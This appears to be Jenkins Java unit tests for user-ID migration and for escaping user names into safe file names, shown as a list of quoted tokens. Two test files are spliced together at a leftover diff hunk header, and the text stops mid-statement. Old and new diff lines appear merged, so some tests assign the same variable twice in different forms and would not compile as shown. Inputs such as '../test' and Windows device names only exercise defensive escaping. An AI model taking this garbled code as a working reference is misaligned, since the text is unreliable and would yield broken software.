".", "assertThat", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "*;", "public", "class", "UserIdMigratorTest", "{", "private", "static", "final", "String", "BASE_RESOURCE_PATH", "=", "\"", "src", "/", "test", "/", "resources", "/", "hudson", "/", "model", "/", "\";", "@", "Rule", "public", "TestName", "name", "=", "new", "TestName", "(", ");", "@", "Test", "public", "void", "needsMigrationBasic", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "assertThat", "(", "migrator", ".", "needsMigration", "(", "),", "is", "(", "true", ")", ");", "}", "@", "Test", "public", "void", "needsMigrationFalse", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "assertThat", "(", "migrator", ".", "needsMigration", "(", "),", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "needsMigrationNoneExisting", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "assertThat", "(", "migrator", ".", "needsMigration", "(", "),", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "needsMigrationNoUserConfigFiles", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "assertThat", "(", "migrator", ".", "needsMigration", "(", "),", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "scanExistingUsersNone", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "UserIdMigrator", "migrator", "=", "new", "UserIdMigrator", "(", "usersDirectory", ",", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "Map", "<", "String", ",", "File", ">", "userMappings", "=", "migrator", ".", "scanExistingUsers", "(", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "empty", "(", "))", ";", "}", "@", "Test", "public", "void", "scanExistingUsersNoUsersDirectory", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "Map", "<", "String", ",", "File", ">", "userMappings", "=", "migrator", ".", "scanExistingUsers", "(", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "empty", "(", "))", ";", "}", "@", "Test", "public", "void", "scanExistingUsersBasic", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "Map", "<", "String", ",", "File", ">", "userMappings", "=", "migrator", ".", "scanExistingUsers", "(", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasSize", "(", "2", ")", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasItems", "(", "\"", "admin", "\"", ",", "\"", "jane", "\"", "))", ";", "}", "@", "Test", "public", "void", "scanExistingUsersLegacy", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "Map", "<", "String", ",", "File", ">", "userMappings", "=", "migrator", ".", "scanExistingUsers", "(", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasSize", "(", "8", ")", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasItems", "(", "\"", "foo", "/", "bar", "\"", ",", "\"", "foo", "/", "bar", "/", "baz", "\"", ",", "\"", "/\"", ",", "\"", "..", "\",", "\"", "bla", "$", "phem", ".", "us", "\"", ",", "\"", "make", "$", "1000000", "\"", ",", "\"", "big", "$", "money", "\"", ",", "\"", "~", "com1", "\"", "))", ";", "}", "@", "Test", "public", "void", "scanExistingUsersOldLegacy", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "Map", "<", "String", ",", "File", ">", "userMappings", "=", "migrator", ".", "scanExistingUsers", "(", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasSize", "(", "4", ")", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasItems", "(", "\"", "make", "\\", "u1000000", "\"", ",", "\"", "\\", "u306f", "\\", "u56fd", "\\", "u5185", "\\", "u3067", "\\", "u6700", "\\", "u5927", "\"", ",", "\"", "\\", "u1000yyy", "\"", ",", "\"", "zzz", "\\", "u1000", "\"", "))", ";", "}", "@", "Test", "public", "void", "emptyUsernameConfigScanned", "(", ")", "throws", "IOException", "{", "UserIdMigrator", "migrator", "=", "createUserIdMigrator", "(", ");", "Map", "<", "String", ",", "File", ">", "userMappings", "=", "migrator", ".", "scanExistingUsers", "(", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasSize", "(", "2", ")", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasItems", "(", "\"", "admin", "\"", ",", "\"", "\")", ");", "}", "@", "Test", "public", "void", "scanExistingUsersCaseSensitive", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "UserIdMigrator", "migrator", "=", "new", "UserIdMigrator", "(", "usersDirectory", ",", "new", "IdStrategy", ".", "CaseSensitive", "(", "))", ";", "Map", "<", "String", ",", "File", ">", "userMappings", "=", "migrator", ".", "scanExistingUsers", "(", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasSize", "(", "3", ")", ");", "assertThat", "(", "userMappings", ".", "keySet", "(", "),", "hasItems", "(", "\"", "admin", "\"", ",", "\"", "Fred", "\"", ",", "\"", "Jane", "\"", "))", ";", "}", "@", "Test", "public", "void", "migrateSimpleUser", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "UserIdMigrator", "migrator", "=", "new", "UserIdMigrator", "(", "usersDirectory", ",", "idStrategy", ")", ";", "TestUserIdMapper", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "assertThat", "(", "migrator", ".", "needsMigration", "(", "),", "is", "(", "false", ")", ");", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", ").", "size", "(", "),", "is", "(", "1", ")", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "fred", "\"", "),", "is", "(", "true", ")", ");", "}", "@", "Test", "public", "void", "migrateMultipleUsers", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "UserIdMigrator", "migrator", "=", "new", "UserIdMigrator", "(", "usersDirectory", ",", "idStrategy", ")", ";", "TestUserIdMapper", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "assertThat", "(", "migrator", ".", "needsMigration", "(", "),", "is", "(", "false", ")", ");", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", ").", "size", "(", "),", "is", "(", "3", ")", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "fred", "\"", "),", "is", "(", "true", ")", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "foo", "/", "bar", "\"", "),", "is", "(", "true", ")", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "zzz", "\\", "u1000", "\"", "),", "is", "(", "true", ")", ");", "}", "@", "Test", "public", "void", "migrateUsersXml", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "UserIdMigrator", "migrator", "=", "new", "UserIdMigrator", "(", "usersDirectory", ",", "idStrategy", ")", ";", "TestUserIdMapper", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "assertThat", "(", "migrator", ".", "needsMigration", "(", "),", "is", "(", "false", ")", ");", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", ").", "size", "(", "),", "is", "(", "1", ")", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "users", ".", "xml", "\"", "),", "is", "(", "true", ")", ");", "}", "@", "Test", "public", "void", "migrateEntireDirectory", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "UserIdMigrator", "migrator", "=", "new", "UserIdMigrator", "(", "usersDirectory", ",", "idStrategy", ")", ";", "TestUserIdMapper", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "File", "fredDirectory", "=", "mapper", ".", "getDirectory", "(", "\"", "fred", "\"", ");", "File", "otherFile", "=", "new", "File", "(", "fredDirectory", ",", "\"", "otherfile", ".", "txt", "\"", ");", "assertThat", "(", "otherFile", ".", "exists", "(", "),", "is", "(", "true", ")", ");", "File", "originalFredDirectory", "=", "new", "File", "(", "usersDirectory", ",", "\"", "fred", "\"", ");", "assertThat", "(", "originalFredDirectory", ".", "exists", "(", "),", "is", "(", "false", ")", ");", "}", "static", "File", "createTestDirectory", "(", "Class", "clazz", ",", "TestName", "testName", ")", "throws", "IOException", "{", "File", "tempDirectory", "=", "Files", ".", "createTempDirectory", "(", "Paths", ".", "get", "(", "\"", "target", "\"", "),", "\"", "userIdMigratorTest", "\"", ").", "toFile", "(", ");", "tempDirectory", ".", "deleteOnExit", "(", ");", "copyTestDataIfExists", "(", "clazz", ",", "testName", ",", "tempDirectory", ")", ";", "return", "new", "File", "(", "tempDirectory", ",", "\"", "users", "\"", ");", "}", "static", "void", "copyTestDataIfExists", "(", "Class", "clazz", ",", "TestName", "testName", ",", "File", "tempDirectory", ")", "throws", "IOException", "{", "File", "resourcesDirectory", "=", "new", "File", "(", "BASE_RESOURCE_PATH", "+", "clazz", ".", "getSimpleName", "(", "),", "testName", ".", "getMethodName", "(", "))", ";", "if", "(", "resourcesDirectory", ".", "exists", "(", "))", "{", "FileUtils", ".", "copyDirectory", "(", "resourcesDirectory", ",", "tempDirectory", ")", ";", "}", "}", "private", "UserIdMigrator", "createUserIdMigrator", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "return", "new", "UserIdMigrator", "(", "usersDirectory", ",", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "}", "}", "@", "@", "-", "2", ",", "101", "+", "2", ",", "233", "@", "@", "import", "org", ".", "junit", ".", "Test", ";", "import", "java", ".", "util", ".", "Locale", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "hamcrest", ".", "core", ".", "Is", ".", "is", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertFalse", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertThat", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "public", "class", "IdStrategyTest", "{", "private", "IdStrategy", "idStrategy", ";", "@", "Test", "public", "void", "caseInsensitive", "(", ")", "{", "idStrategy", "=", "new", "IdStrategy", ".", "CaseInsensitive", "(", ");", "assertRestrictedNames", "(", ");", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseInsensitive", "(", ");", "assertRestrictedNames", "(", "idStrategy", ")", ";", "assertRoundTrip", "(", "\"", "foo", "\"", ",", "\"", "foo", "\"", ");", "assertRoundTrip", "(", "\"", "foo", "/", "bar", "\"", ",", "\"", "foo", "$", "002fbar", "\"", ");", "assertRoundTrip", "(", "\".", "./", "test", "\"", ",", "\"", "..", "$", "002ftest", "\"", ");", "assertRoundTrip", "(", "\"", "0123", "_", "-", "@~", "a", "\"", ",", "\"", "0123", "_", "-", "@$", "007ea", "\"", ");", "assertRoundTrip", "(", "\"", "foo", ".", "\",", "\"", "foo", "$", "002e", "\"", ");", "assertRoundTrip", "(", "\"-", "foo", "\"", ",", "\"", "$", "002dfoo", "\"", ");", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "foo", "\"", "),", "is", "(", "\"", "foo", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "foo", "$", "002fbar", "\"", "),", "is", "(", "\"", "foo", "/", "bar", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\".", ".$", "002ftest", "\"", "),", "is", "(", "\".", "./", "test", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "0123", "_", "-", "@$", "007ea", "\"", "),", "is", "(", "\"", "0123", "_", "-", "@~", "a", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "foo", "$", "002e", "\"", "),", "is", "(", "\"", "foo", ".", "\")", ");", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "002dfoo", "\"", "),", "is", "(", "\"-", "foo", "\"", "))", ";", "/", "/", "Should", "not", "return", "the", "same", "username", "due", "to", "case", "insensitivity", "assertCaseInsensitiveRoundTrip", "(", "\"", "Foo", "\"", ",", "\"", "foo", "\"", ");", "assertCaseInsensitiveRoundTrip", "(", "\"", "Foo", "/", "Bar", "\"", ",", "\"", "foo", "$", "002fbar", "\"", ");", "assertCaseInsensitiveRoundTrip", "(", "\".", "./", "Test", "\"", ",", "\"", "..", "$", "002ftest", "\"", ");", "assertCaseInsensitiveRoundTrip", "(", "\"", "NUL", "\"", ",", "\"", "$", "006eul", "\"", ");", "assertEquals", "(", "\"", "foo", "\"", ",", "idStrategy", ".", "idFromFilename", "(", "\"~", "foo", "\"", "))", ";", "assertEquals", "(", "\"", "0123", "_", "-", "@", "a", "\"", ",", "idStrategy", ".", "idFromFilename", "(", "\"", "0123", "_", "-", "@~", "a", "\"", "))", ";", "assertEquals", "(", "\"", "big", "$", "money", "\"", ",", "idStrategy", ".", "idFromFilename", "(", "\"", "big", "$", "money", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "Foo", "\"", "),", "is", "(", "\"", "foo", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "Foo", "$", "002fBar", "\"", "),", "is", "(", "\"", "foo", "/", "bar", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\".", ".$", "002fTest", "\"", "),", "is", "(", "\".", "./", "test", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "006eul", "\"", "),", "is", "(", "\"", "nul", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "foo", "\"", "),", "is", "(", "\"~", "foo", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "0123", "_", "-", "@~", "a", "\"", "),", "is", "(", "\"", "0123", "_", "-", "@~", "a", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "big", "$", "money", "\"", "),", "is", "(", "\"", "big", "$", "money", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "00c1aaa", "\"", "),", "is", "(", "\"\\", "u00e1aaa", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "00e1aaa", "\"", "),", "is", "(", "\"\\", "u00e1aaa", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "aaaa", "$", "00e1", "\"", "),", "is", "(", "\"", "aaaa", "\\", "u00e1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "aaaa", "$", "00e1kkkk", "\"", "),", "is", "(", "\"", "aaaa", "\\", "u00e1kkkk", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "aa", "$", "00e1zz", "$", "00e9pp", "\"", "),", "is", "(", "\"", "aa", "\\", "u00e1zz", "\\", "u00e9pp", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "306f", "$", "56fd", "$", "5185", "$", "3067", "$", "6700", "$", "5927", "\"", "),", "is", "(", "\"\\", "u306f", "\\", "u56fd", "\\", "u5185", "\\", "u3067", "\\", "u6700", "\\", "u5927", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "00E1aaa", "\"", "),", "is", "(", "\"$", "00e1aaa", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "001gggg", "\"", "),", "is", "(", "\"$", "001gggg", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "rrr", "$", "t123", "\"", "),", "is", "(", "\"", "rrr", "$", "t123", "\"", "))", ";", "}", "@", "Test", "public", "void", "caseInsensitivePassesThroughOldLegacy", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseInsensitive", "(", ");", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "make", "\\", "u1000000", "\"", "),", "is", "(", "\"", "make", "\\", "u1000000", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"\\", "u306f", "\\", "u56fd", "\\", "u5185", "\\", "u3067", "\\", "u6700", "\\", "u5927", "\"", "),", "is", "(", "\"\\", "u306f", "\\", "u56fd", "\\", "u5185", "\\", "u3067", "\\", "u6700", "\\", "u5927", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "fred", "\"", "),", "is", "(", "\"~", "fred", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "1fred", "\"", "),", "is", "(", "\"~", "1fred", "\"", "))", ";", "}", "@", "Test", "public", "void", "caseSensitive", "(", ")", "{", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "assertRestrictedNames", "(", ");", "assertRoundTrip", "(", "\"", "foo", "\"", ",", "\"", "foo", "\"", ");", "assertRoundTrip", "(", "\"", "Foo", "\"", ",", "\"", "~", "foo", "\"", ");", "assertRoundTrip", "(", "\"", "foo", "/", "bar", "\"", ",", "\"", "foo", "$", "002fbar", "\"", ");", "assertRoundTrip", "(", "\"", "Foo", "/", "Bar", "\"", ",", "\"", "~", "foo", "$", "002f", "~", "bar", "\"", ");", "assertRoundTrip", "(", "\".", "./", "test", "\"", ",", "\"", "..", "$", "002ftest", "\"", ");", "assertRoundTrip", "(", "\".", "./", "Test", "\"", ",", "\"", "..", "$", "002f", "~", "test", "\"", ");", "assertRoundTrip", "(", "\"", "0123", "_", "-", "@~", "a", "\"", ",", "\"", "0123", "_", "-", "@$", "007ea", "\"", ");", "assertRoundTrip", "(", "\"", "0123", "_", "-", "@", "A", "\"", ",", "\"", "0123", "_", "-", "@~", "a", "\"", ");", "assertRoundTrip", "(", "\"", "foo", ".", "\",", "\"", "foo", "$", "002e", "\"", ");", "assertRoundTrip", "(", "\"-", "foo", "\"", ",", "\"", "$", "002dfoo", "\"", ");", "assertRoundTrip", "(", "\"", "Con", "\"", ",", "\"", "~", "con", "\"", ");", "assertRoundTrip", "(", "\"", "Prn", "\"", ",", "\"", "~", "prn", "\"", ");", "assertRoundTrip", "(", "\"", "Aux", "\"", ",", "\"", "~", "aux", "\"", ");", "assertRoundTrip", "(", "\"", "Nul", "\"", ",", "\"", "~", "nul", "\"", ");", "assertRoundTrip", "(", "\"", "Com1", "\"", ",", "\"", "~", "com1", "\"", ");", "assertRoundTrip", "(", "\"", "Lpt1", "\"", ",", "\"", "~", "lpt1", "\"", ");", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "assertRestrictedNames", "(", "idStrategy", ")", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "foo", "\"", "),", "is", "(", "\"", "foo", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "foo", "\"", "),", "is", "(", "\"", "Foo", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "foo", "$", "002fbar", "\"", "),", "is", "(", "\"", "foo", "/", "bar", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "foo", "$", "002f", "~", "bar", "\"", "),", "is", "(", "\"", "Foo", "/", "Bar", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\".", ".$", "002ftest", "\"", "),", "is", "(", "\".", "./", "test", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\".", ".$", "002f", "~", "test", "\"", "),", "is", "(", "\".", "./", "Test", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "0123", "_", "-", "@$", "007ea", "\"", "),", "is", "(", "\"", "0123", "_", "-", "@~", "a", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "0123", "_", "-", "@~", "a", "\"", "),", "is", "(", "\"", "0123", "_", "-", "@", "A", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "foo", "$", "002e", "\"", "),", "is", "(", "\"", "foo", ".", "\")", ");", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "002dfoo", "\"", "),", "is", "(", "\"-", "foo", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "con", "\"", "),", "is", "(", "\"", "Con", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "prn", "\"", "),", "is", "(", "\"", "Prn", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "aux", "\"", "),", "is", "(", "\"", "Aux", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "nul", "\"", "),", "is", "(", "\"", "Nul", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "com1", "\"", "),", "is", "(", "\"", "Com1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "lpt1", "\"", "),", "is", "(", "\"", "Lpt1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "big", "$", "money", "\"", "),", "is", "(", "\"", "big", "$", "money", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "00c1aaa", "\"", "),", "is", "(", "\"\\", "u00c1aaa", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "00e1aaa", "\"", "),", "is", "(", "\"\\", "u00e1aaa", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "aaaa", "$", "00e1", "\"", "),", "is", "(", "\"", "aaaa", "\\", "u00e1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "aaaa", "$", "00e1kkkk", "\"", "),", "is", "(", "\"", "aaaa", "\\", "u00e1kkkk", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "aa", "$", "00e1zz", "$", "00e9pp", "\"", "),", "is", "(", "\"", "aa", "\\", "u00e1zz", "\\", "u00e9pp", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "306f", "$", "56fd", "$", "5185", "$", "3067", "$", "6700", "$", "5927", "\"", "),", "is", "(", "\"\\", "u306f", "\\", "u56fd", "\\", "u5185", "\\", "u3067", "\\", "u6700", "\\", "u5927", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "00E1aaa", "\"", "),", "is", "(", "\"$", "00E1aaa", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"$", "001gggg", "\"", "),", "is", "(", "\"$", "001gggg", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "rRr", "$", "t123", "\"", "),", "is", "(", "\"", "rRr", "$", "t123", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "iiii", "_", "-", "@$", "007", "~", "ea", "\"", "),", "is", "(", "\"", "iiii", "_", "-", "@$", "007Ea", "\"", "))", ";", "}", "@", "Test", "public", "void", "caseSensitivePassesThroughOldLegacy", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"", "make", "\\", "u1000000", "\"", "),", "is", "(", "\"", "make", "\\", "u1000000", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"\\", "u306f", "\\", "u56fd", "\\", "u5185", "\\", "u3067", "\\", "u6700", "\\", "u5927", "\"", "),", "is", "(", "\"\\", "u306f", "\\", "u56fd", "\\", "u5185", "\\", "u3067", "\\", "u6700", "\\", "u5927", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "idFromFilename", "(", "\"~", "1fred", "\"", "),", "is", "(", "\"~", "1fred", "\"", "))", ";", "}", "@", "Test", "public", "void", "testEqualsCaseInsensitive", "(", ")", "{", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "assertTrue", "(", "idStrategy", ".", "equals", "(", "\"", "user1", "\"", ",", "\"", "User1", "\"", "))", ";", "assertTrue", "(", "idStrategy", ".", "equals", "(", "\"", "User1", "\"", ",", "\"", "user1", "\"", "))", ";", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "User1", "\"", ",", "\"", "user2", "\"", "))", ";", "String", "sameUser", "=", "\"", "sameUser", "\"", ";", "assertTrue", "(", "idStrategy", ".", "equals", "(", "sameUser", ",", "sameUser", ")", ");", "}", "@", "Test", "public", "void", "testEqualsCaseSensitive", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "user1", "\"", ",", "\"", "User1", "\"", "))", ";", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "User1", "\"", ",", "\"", "user1", "\"", "))", ";", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "User1", "\"", ",", "\"", "user2", "\"", "))", ";", "String", "sameUser", "=", "\"", "sameUser", "\"", ";", "assertTrue", "(", "idStrategy", ".", "equals", "(", "sameUser", ",", "sameUser", ")", ");", "}", "@", "Test", "public", "void", "testEqualsCaseSensitiveEmailAddress", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitiveEmailAddress", "(", ");", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", "))", ";", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "ACME", ".", "org", "\"", "))", ";", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "ACME", ".", "org", "\"", "))", ";", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "ORG", "\"", "))", ";", "assertFalse", "(", "idStrategy", ".", "equals", "(", "\"", "John", "@", "smith", "@", "acme", ".", "org", "\"", ",", "\"", "john", "@", "Smith", "@", "acme", ".", "ORG", "\"", "))", ";", "String", "sameUser", "=", "\"", "john", ".", "smith", "@", "acme", ".", "org", "\"", ";", "assertTrue", "(", "idStrategy", ".", "equals", "(", "sameUser", ",", "sameUser", ")", ");", "assertTrue", "(", "idStrategy", ".", "equals", "(", "\"", "John", ".", "Smith", "@", "ACME", ".", "org", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", "))", ";", "assertTrue", "(", "idStrategy", ".", "equals", "(", "\"", "John", ".", "Smith", "@", "acme", ".", "ORG", "\"", ",", "\"", "John", ".", "Smith", "@", "acme", ".", "org", "\"", "))", ";", "assertTrue", "(", "idStrategy", ".", "equals", "(", "\"", "john", "@", "smith", "@", "ACME", ".", "org", "\"", ",", "\"", "john", "@", "smith", "@", "acme", ".", "org", "\"", "))", ";", "}", "@", "Test", "public", "void", "testKeyForCaseInsensitive", "(", ")", "{", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "user1", "\"", "),", "is", "(", "\"", "user1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "User1", "\"", "),", "is", "(", "\"", "user1", "\"", "))", ";", "assertThat", "(", "idStrategy", ".", "keyFor", "(", "\"", "USER1", "\"", "),", "is", "(", "\"", "user1", "\"", "))", ";", "}", "@", "Test", "public", "void", "testKeyForCaseSensitive", "(", ")", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", 